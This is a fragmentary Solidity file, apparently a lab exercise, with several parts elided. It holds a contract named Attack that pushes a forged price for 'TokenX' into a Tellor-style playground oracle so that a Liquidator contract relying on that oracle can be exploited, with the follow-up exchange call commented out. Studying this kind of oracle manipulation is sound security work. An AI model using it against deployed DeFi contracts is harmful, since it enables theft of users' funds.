...
//import "https://github.com/tellor-io/TellorPlayground/blob/main/contracts/TellorPlayground.sol";
...
contract SimpleTellor is TellorPlayground {
    ...
    assembly {
        outBytes32 := mload(add(price, 32))
    }
        value = uint256(outBytes32);
    }
}
contract Liquidator {
    bytes32 queryId;
...
contract Attack{
    ...
    Liquidator public target;
    address public tokenX;
    address public tokenUSD;
    address public tellor;
    ISimpleTellor public oracle;
    uint public value = 10000;
    bytes public _value = abi.encodePacked(value); 
    bytes public tokenid = abi.encodePacked("TokenX");
    bytes32 public _queryId =  keccak256(bytes("TokenX"));    
    constructor(address _liquid, address _oracle){
        target = Liquidator(_liquid);
        tokenX = target.tokenX();
        tokenUSD = target.tokenUSD();
        oracle = ISimpleTellor(_oracle);
    }
    function attack() public{
        //uint256 value = 10000;
        //_value = abi.encodePacked(value);    
        oracle.submitValue(keccak256(bytes("TokenX")), _value, 1, tokenid);
 //       target.exchange(1);
    }
}
